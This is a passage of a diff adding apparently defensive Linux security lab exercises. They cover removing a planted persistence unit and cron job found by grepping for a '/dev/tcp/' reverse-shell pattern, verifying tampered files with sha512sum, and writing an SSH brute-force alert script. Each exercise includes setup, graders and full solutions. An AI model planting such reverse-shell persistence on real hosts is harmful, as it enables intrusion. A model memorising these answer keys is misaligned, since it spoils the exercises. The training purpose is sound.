+    chmod 644 /etc/cron.d/kl-sysstat /etc/cron.d/kl-logsweep
+    systemctl daemon-reload
+    systemctl enable kl-netmon.service >/dev/null 2>&1
+  check: |
+    check_not "malicious unit file removed" '[ -e /etc/systemd/system/kl-netmon.service ]'
+    check_not "unit no longer enabled" 'ls /etc/systemd/system/*.wants/kl-netmon.service'
+    check_not "malicious cron job removed" '[ -e /etc/cron.d/kl-sysstat ]'
+    check_not "no reverse-shell pattern left" 'grep -rqs "/dev/tcp/" /etc/cron.d /etc/systemd/system'
+    check "legitimate units kept" '[ -f /etc/systemd/system/kl-portcheck.service ] && [ -f /etc/systemd/system/kl-metrics.service ]'
+    check "legitimate cron job kept" '[ -f /etc/cron.d/kl-logsweep ]'
+    got=$(tr -d '[:space:]' 2>/dev/null </lab/c2.txt)
+    check_eq "callback address recorded" "$got" "$(cat $KL_STATE/answer)"
+  solve: |
+    sudo grep -rhoE '/dev/tcp/[0-9.]+/[0-9]+' /etc/cron.d /etc/systemd/system | head -1 \
+      | sed 's#/dev/tcp/##; s#/#:#' > /lab/c2.txt
+    sudo systemctl disable kl-netmon.service
+    sudo rm -f /etc/systemd/system/kl-netmon.service /etc/cron.d/kl-sysstat
+    sudo systemctl daemon-reload
+
+- id: sec-034
+  title: Which files were tampered with?
+  difficulty: 2
+  kind: build
+  tags: [integrity, sha512sum, tamper, forensics]
+  tutorial: |
+    **Concept.** Timestamps and sizes are easy for an attacker to preserve, so they cannot prove a file is unchanged. A cryptographic hash of the content can, provided you compare against a manifest you trust.
+
+    **Read up on:**
+    - `sha512sum -c` — verify a tree against a manifest
+    - `ls -l --time-style=full-iso` — see why metadata alone misleads
+    - `cut` and `while read` — turn a list of names into new commands
+    - `sha512sum FILE` — compute a current hash
+  scenario: |
+    The website in **`/lab/site`** was published together with the trusted manifest
+    **`/lab/manifest.sha512`** (paths are relative to the site directory). Sizes and
+    modification times look normal everywhere.
+
+    Find the files whose **content** no longer matches the manifest and write their
+    **current** SHA-512 hashes to **`/lab/tampered.txt`**, in `sha512sum` format
+    (`HASH  PATH`, path relative to `/lab/site`), one line per file.
+
+    A file that is simply not in the manifest is not a mismatch.
+  hints:
+    - "`sha512sum -c` has to run from the directory the manifest paths are relative to."
+    - "`--quiet` prints only the failures, as `PATH: FAILED`."
+    - "Hash each failed file again to get its current value."
+  solution: |
+    ```bash
+    cd /lab/site
+    sha512sum -c --quiet /lab/manifest.sha512 2>/dev/null | grep ': FAILED$' | cut -d: -f1 \
+      | while read -r f; do sha512sum "$f"; done > /lab/tampered.txt
+    ```
+  setup: |
+    python3 - <<'PY'
+    import os, random, hashlib
+    root = "/lab/site"
+    rels = ["index.html", "about.html", "css/app.css", "css/print.css", "js/app.js", "js/vendor.js",
+            "img/logo.svg", "img/banner.svg", "docs/guide.html", "docs/faq.html"]
+    man = []
+    for rel in rels:
+        p = os.path.join(root, rel)
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        data = ("/* %s */\n" % rel + os.urandom(200).hex() + "\n").encode()
+        open(p, "wb").write(data)
+        os.utime(p, (1762000000, 1762000000))
+        man.append("%s  %s\n" % (hashlib.sha512(data).hexdigest(), rel))
+    open("/lab/manifest.sha512", "w").write("".join(man))
+    exp = []
+    for rel in random.sample(rels, 2):
+        p = os.path.join(root, rel)
+        b = bytearray(open(p, "rb").read())
+        i = len(b) // 2
+        b[i] = ord("A") if b[i] != ord("A") else ord("B")
+        open(p, "wb").write(bytes(b))
+        os.utime(p, (1762000000, 1762000000))
+        exp.append("%s %s" % (hashlib.sha512(bytes(b)).hexdigest(), rel))
+    open(root + "/uploads.tmp", "w").write("not in manifest\n")
+    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(exp, key=lambda l: l.split()[1])) + "\n")
+    PY
+    chown -R "$(lab_user):" /lab
+    on_reset 'rm -f /var/lib/kubelab/answer'
+  check: |
+    got=$(tr -d '\r' 2>/dev/null </lab/tampered.txt | sed 's# \./# #' | awk 'NF>=2{print $1, $2}' | LC_ALL=C sort -k2)
+    check_eq "tampered files with current hashes" "$got" "$(cat $KL_STATE/answer)"
+  solve: |
+    cd /lab/site
+    sha512sum -c --quiet /lab/manifest.sha512 2>/dev/null | grep ': FAILED$' | cut -d: -f1 \
+      | while read -r f; do sha512sum "$f"; done > /lab/tampered.txt
+
+- id: sec-035
+  title: A threshold alert from the auth log
+  difficulty: 4
+  kind: build
+  tags: [alerting, logs, detection, awk]
+  tutorial: |
+    **Concept.** A detection rule turns raw logs into a decision: how many events, grouped by what, within which window. Good rules fire on bursts, stay quiet on slow noise, and work on logs you have not seen.
+
+    **Read up on:**
+    - `awk` associative arrays — count events per composite key
+    - `substr` and field splitting — reduce a timestamp to its minute
+    - `$(NF-n)` — pick fields counted from the end of a line
+    - `man sshd` log lines — what a failed password entry looks like
+  scenario: |
+    Write an alert script, **`/lab/alert.sh`**, that takes a log file path as its first
+    argument and reads SSH authentication entries like the ones in **`/lab/auth.log`**.
+
+    It must print `ALERT <ip>` (one line per address) for every source address with
+    **5 or more `Failed password` entries inside the same calendar minute**
+    (same date, hour and minute). Print nothing for other addresses.
+
+    The script will also be run against logs it has not seen, so do not hard-code
+    addresses.
+  hints:
+    - "The date, hour and minute are the first three fields; cut the time at five characters."
+    - "Key an `awk` counter on the address plus that minute."
+    - "The address is a fixed distance from the end of a `Failed password` line."
+    - "Print each offending address once, even if it burst in several minutes."
+  solution: |
+    ```bash
+    cat > /lab/alert.sh <<'EOF'
+    #!/bin/bash
+    awk '/Failed password/ {
+           ip = $(NF-3); m = $1 " " $2 " " substr($3, 1, 5)
+           c[ip " " m]++
+         }
+         END { for (k in c) if (c[k] >= 5) { split(k, a, " "); print "ALERT", a[1] } }' "$1" | sort -u
+    EOF
+    chmod +x /lab/alert.sh
+    ```
+  setup: |
+    cat > "$KL_STATE/gen035.py" <<'PY'
+    import sys, random, collections
+    log, exp = sys.argv[1:3]
+    ips = random.sample(["198.51.100.%d" % i for i in range(2, 250)], 9)
+    kinds = ["burst", "burst", "exact5", "four", "spread", "boundary", "spread", "four", "burst"]
+    random.shuffle(kinds)
+    ev = []
+    for ip, k in zip(ips, kinds):
+        if k == "burst":
+            m = random.randint(0, 1400)
+            ev += [(m * 60 + random.randint(0, 59), ip, "F") for _ in range(random.randint(6, 10))]
+        elif k == "exact5":
+            m = random.randint(0, 1400)
+            ev += [(m * 60 + s, ip, "F") for s in random.sample(range(60), 5)]
+        elif k == "four":
+            for m in random.sample(range(1440), 2):
+                ev += [(m * 60 + s, ip, "F") for s in random.sample(range(60), 4)]
+        elif k == "spread":
+            ev += [(m * 60 + random.randint(0, 59), ip, "F") for m in random.sample(range(1440), 14)]
+        else:
+            m = random.randint(0, 1400)
+            ev += [(m * 60 + 57 + i % 3, ip, "F") for i in range(3)]
+            ev += [((m + 1) * 60 + i % 3, ip, "F") for i in range(3)]
+    for _ in range(25):
+        ev.append((random.randint(0, 86399), random.choice(ips + ["192.0.2.7", "192.0.2.9"]), "A"))
+    ev.sort()
+    cnt = collections.Counter()
+    out = []
+    for sec, ip, k in ev:
+        t = "Nov  9 %02d:%02d:%02d" % (sec // 3600, sec // 60 % 60, sec % 60)
+        pid = random.randint(1000, 30000)
+        if k == "F":
+            who = random.choice(["root", "admin", "invalid user test", "invalid user oracle", "deploy"])
+            out.append("%s web sshd[%d]: Failed password for %s from %s port %d ssh2" % (t, pid, who, ip, random.randint(20000, 60000)))
+            cnt[(ip, sec // 60)] += 1
+        else:
+            out.append("%s web sshd[%d]: Accepted publickey for deploy from %s port %d ssh2" % (t, pid, ip, random.randint(20000, 60000)))
+    open(log, "w").write("\n".join(out) + "\n")
+    open(exp, "w").write("".join("ALERT %s\n" % i for i in sorted({ip for (ip, m), n in cnt.items() if n >= 5})))
+    PY
+    chmod 600 "$KL_STATE/gen035.py"
+    python3 "$KL_STATE/gen035.py" /lab/auth.log "$KL_STATE/answer"
+    cp /lab/auth.log "$KL_STATE/auth035.log"
+    chown "$(lab_user):" /lab/auth.log
+    on_reset 'rm -f /var/lib/kubelab/gen035.py /var/lib/kubelab/auth035.log'
+  check: |
+    run_alert() { timeout 10 bash /lab/alert.sh "$1" 2>/dev/null | awk '$1=="ALERT"{print $1, $2}' | LC_ALL=C sort -u; }
+    check "alert.sh exists" '[ -f /lab/alert.sh ]'
+    check_eq "alerts on the sample log" "$(run_alert $KL_STATE/auth035.log)" "$(LC_ALL=C sort -u $KL_STATE/answer)"
+    T=$(mktemp -d)
+    python3 "$KL_STATE/gen035.py" "$T/log" "$T/exp"
+    check_eq "alerts on an unseen log" "$(run_alert $T/log)" "$(LC_ALL=C sort -u $T/exp)"
+    rm -rf "$T"
+  solve: |
+    cat > /lab/alert.sh <<'EOF'
+    #!/bin/bash
+    awk '/Failed password/ {
+           ip = $(NF-3); m = $1 " " $2 " " substr($3, 1, 5)
+           c[ip " " m]++
+         }
+         END { for (k in c) if (c[k] >= 5) { split(k, a, " "); print "ALERT", a[1] } }' "$1" | sort -u
+    EOF
+    chmod +x /lab/alert.sh
